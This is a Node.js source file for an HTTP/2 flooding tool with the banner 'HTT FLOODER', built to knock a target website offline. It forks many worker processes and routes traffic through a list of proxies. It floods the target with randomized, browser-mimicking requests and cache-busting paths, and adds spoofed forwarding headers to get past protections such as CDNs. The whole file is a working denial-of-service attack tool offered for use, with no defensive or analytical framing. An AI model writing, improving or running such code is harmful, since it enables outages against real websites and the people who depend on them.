const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const figlet = require("figlet");
const chalk = require("chalk");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7) {
    console.log(chalk.red(`Usage: target time rate thread proxyfile`));
    process.exit();
}

const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]) * 10,  // Increase RPS by 10 times
    threads: parseInt(process.argv[5]) * 10, // Increase threads by 10 times
    proxyFile: process.argv[6]
};

const sig = [
    'ecdsa_secp256r1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
    'hmac_sha256',
    'ecdsa_secp384r1_sha384',
    'rsa_pkcs1_sha1',
    'hmac_sha1'
];

const accept_header = [
    '*/*',
    'image/*',
    'image/webp,image/apng',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'application/json',
    'application/xml',
    'application/pdf',
    'text/css',
    'application/javascript'
];

const lang_header = [
    'ko-KR',
    'en-US',
    'zh-CN',
    'zh-TW',
    'en-ZA',
    'fr-FR',
    'ja-JP',
    'ar-EG',
    'de-DE',
    'es-ES'
];

const encoding_header = [
    'gzip, deflate, br',
    'deflate',
    'gzip, deflate, lzma, sdch',
    'deflate',
    'identity',
    'compress',
    'br'
];

const version = [
    '"Google Chrome";v="113", "Chromium";v="113", ";Not A Brand";v="99"',
    '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    '"Mozilla Firefox";v="91", ";Not A Brand";v="99"',
    '"Safari";v="14.1.2", "Chrome";v="91.0.4472.164", "Safari";v="14.1.2"',
    '"Opera";v="79.0.4143.22", "Chrome";v="92.0.4515.115", "Opera";v="79.0.4143.22"',
    '"Microsoft Edge";v="92.0.902.62", "Chrome";v="92.0.4515.131", "Microsoft Edge";v="92.0.902.62"'
];

const rateHeaders = [
    { "akamai-origin-hop": randstr(12) },
    { "proxy-client-ip": randstr(12) },
    { "via": randstr(12) },
    { "cluster-ip": randstr(12) },
    { "user-agent": randstr(12) },
];

var siga = sig[Math.floor(Math.random() * sig.length)];
var ver = version[Math.floor(Math.random() * version.length)];
var accept = accept_header[Math.floor(Math.random() * accept_header.length)];
var lang = lang_header[Math.floor(Math.random() * lang_header.length)];
var encoding = encoding_header[Math.floor(Math.random() * encoding_header.length)];
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

// Banner
figlet('HTT FLOODER', (err, data) => {
    if (err) {
        console.log(chalk.red('Something went wrong with the banner.'));
        return;
    }
    console.log(chalk.green(data));
    console.log(chalk.cyan(`[ • ] Tool: HTT Flooder`));
    console.log(chalk.cyan(`[ • ] Target: ${parsedTarget.host}`));
    console.log(chalk.cyan(`[ • ] Duration: ${args.time} seconds`));
    console.log(chalk.cyan(`[ • ] Threads: ${args.threads}`));
    console.log(chalk.cyan(`[ • ] Requests per second: ${args.Rate}`));
    console.log(chalk.cyan(`[ • ] Proxylist: ${args.proxyFile}\n`));
});

// Master process logic
if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    console.clear();
} else {
    setInterval(runFlooder);
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true,
        });

        connection.setTimeout(options.timeout * 100000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?" + randstr(10) + "=" + randstr(5);
headers[":scheme"] = "https";
headers["sec-ch-ua"] = ver;
headers["sec-ch-ua-platform"] = "Windows";
headers["sec-ch-ua-mobile"] = "?0";
headers["accept-encoding"] = encoding;
headers["accept-language"] = lang;
headers["upgrade-insecure-requests"] = "1";
headers["accept"] = accept;
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-site"] = "same-origin";
headers["sec-fetch-user"] = "?1";
headers["x-requested-with"] = "XMLHttpRequest";

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            connection.close();
            connection.destroy();
            return;
        }

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2'],
            sigals: siga,
            socket: connection,
            ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
            ecdhCurve: 'P-256:P-384',
            host: parsedTarget.host,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 10000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            createConnection: () => tlsConn,
        });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                const dynHeaders = {
                    ...headers,
                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
                };
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(dynHeaders);

                    request.on("response", response => {
                        request.close();
                        request.destroy();
                        return;
                    });

                    request.end();
                }
            }, 500); // Adjust interval based on attack strength
        });

        client.on("close", () => {
            client.destroy();
            return;
        });
    });

    const killer = () => process.exit(1);
    setTimeout(killer, args.time * 1000);
}
